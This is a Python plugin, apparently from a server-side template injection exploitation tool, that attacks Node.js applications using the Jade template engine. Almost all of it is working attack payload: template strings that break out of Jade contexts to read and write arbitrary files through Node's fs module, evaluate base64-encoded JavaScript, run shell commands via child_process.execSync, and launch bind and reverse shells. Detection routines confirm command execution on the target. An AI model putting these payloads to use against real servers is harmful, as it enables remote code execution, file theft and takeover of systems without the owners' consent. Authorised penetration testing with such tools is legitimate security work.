from utils.strings import quote, chunkit, md5
from utils.loggers import log
from core import languages
from core.plugin import Plugin
from utils import rand
import base64
import re


class Jade(Plugin):

    actions = {
        'render' : {
            'call': 'inject',
            'render': '\n= %(code)s\n',
            'header': '\n= %(header)s\n',
            'trailer': '\n= %(trailer)s\n',
            'render_test': """'%(s1)s'+'%(s2)s'""" % { 
                's1' : rand.randstrings[0], 
                's2' : rand.randstrings[1]
            },
            'render_expected': '%(res)s' % { 
                'res' : rand.randstrings[0]+rand.randstrings[1] 
            }
        },
        # No evaluate_blind here, since we've no sleep, we'll use inject
        'write' : {
            'call' : 'inject',
            # Payloads calling inject must start with \n to break out already started lines
            'write' : """\n- global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
            'truncate' : """\n- global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
        },
        'read' : {
            'call': 'render',
            'read' : """= global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
        },
        'md5' : {
            'call': 'render',
            'md5': """- x = global.process.mainModule.require
= x('crypto').createHash('md5').update(x('fs').readFileSync('%(path)s')).digest("hex")
"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': """= eval(Buffer('%(code_b64)s', 'base64').toString())"""
        },
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        # Not using execute here since it's rendered and requires set headers and trailers
        'execute_blind' : {
            'call': 'inject',
            # execSync() has been introduced in node 0.11, so this will not work with old node versions.
            # TODO: use another function.
            
            # Payloads calling inject must start with \n to break out already started lines
            
            # It's two lines command to avoid false positive with Javascript module
            'execute_blind': """
- x = global.process.mainModule.require
- x('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')//"""
        },
        'execute' : {
            'call': 'render',
            'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        }
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },

        # Attribute close a(href=\'%s\')
        { 'level': 1, 'prefix' : '%(closure)s)', 'suffix' : '//', 'closures' : { 1: languages.javascript_ctx_closures[1] } },
        # String interpolation #{
        { 'level': 2, 'prefix' : '%(closure)s}', 'suffix' : '//', 'closures' : languages.javascript_ctx_closures },
        # Code context
        { 'level': 2, 'prefix' : '%(closure)s\n', 'suffix' : '//', 'closures' : languages.javascript_ctx_closures },
    ]

    language = 'javascript'

    def rendered_detected(self):

        os = self.evaluate("""global.process.mainModule.require('os').platform()""")
        if os and re.search('^[\w-]+$', os):
            self.set('os', os)
            self.set('evaluate', self.language)
            self.set('write', True)
            self.set('read', True)

            expected_rand = str(rand.randint_n(2))
            if expected_rand == self.execute('echo %s' % expected_rand):
                self.set('execute', True)
                self.set('bind_shell', True)
                self.set('reverse_shell', True)


    def blind_detected(self):

        self.set('engine', self.plugin.lower())
        self.set('language', self.language)

        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)
